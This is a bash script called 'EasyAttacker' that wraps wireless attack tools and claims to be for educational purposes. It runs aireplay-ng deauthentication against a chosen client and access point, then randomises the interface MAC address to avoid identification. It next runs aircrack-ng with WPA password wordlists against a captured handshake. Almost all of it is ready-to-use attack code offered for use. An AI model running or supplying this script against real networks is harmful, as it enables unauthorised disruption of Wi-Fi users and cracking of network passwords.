#!/bin/bash
echo"EasyAttacker script BY iRaQi-ViRus FOR EDUCATIONAL PORPUSES ONLY, USE AGAINST NETWORKS THAT YOU ARE ALLOWED TO ATTACK!"
echo "by running the script you agree that YOU WILL TAKE RESPONSIBILITY FOR YOUR ACTIONS AND iRaQi-ViRuS has nothing to do with your actions."
echo "do you want to run Aireplay-ng script? (y/n)"
read ans
if [ "${ans}" = "y" ]; then

echo "what interface you want to use ? (1-4)"
echo "wlan0mon (1)"
echo "wlan0    (2)"
echo "wlan1    (3)"
echo "wlan1mon (4)"
read interface

if [ "${interface}" = "1" ]; then
interface=wlan0mon
elif [ "${interface}" = "2" ]; then
interface=wlan0
elif [ "${interface}" = "3" ]; then
interface=wlan1
elif [ "${interface}" = "4" ]; then
interface=wlan1mon
fi

echo "station:"
read station

echo "bssid:"
read bssid

echo "Enter current:"
read current

aireplay-ng -0 ${current} --ignore-negative-one -a "${bssid}" -c "${station}" "${interface}"
ifconfig "${interface}" down
macchanger -r "${interface}"
ifconfig "${interface}" up

else
echo "continuing..."
fi

echo "do you want to run Aircrack-ng script? (y/n)"
read ans2

echo "which passwords list do you want to use ? (1-5)"
echo "14pass.txt                         (1)"
echo "Top204Thousand-WPA-probable-v2.txt (2)"
echo "Top4800-WPA-probable-v2.txt        (3)"
echo "Top447-WPA-probable-v2.txt         (4)"
echo "Top62-WPA-probable-v2.txt          (5)"
read list
if [ "${list}" = "1" ]; then
list=14pass.txt
elif [ "${list}" = "2" ]; then
list=Top204Thousand-WPA-probable-v2.txt
elif [ "${list}" = "3" ]; then
list=Top4800-WPA-probable-v2.txt
elif [ "${list}" = "4" ]; then
list=Top447-WPA-probable-v2.txt
elif [ "${list}" = "5" ]; then
list=Top62-WPA-probable-v2.txt
else
list=14pass.txt
fi

if [ "${ans2}" = "y" ]; then
echo "enter the handshake file:"
read file
echo "enter bssid:"
read bssid

        aircrack-ng -w "${list}" --bssid "${bssid}" "${file}".cap

#elif [ "$ans2" = "n" ]; then
#echo "Exiting... Good Bye ^^"
else 
echo "Exiting... Good Bye ^^"
exit

fi
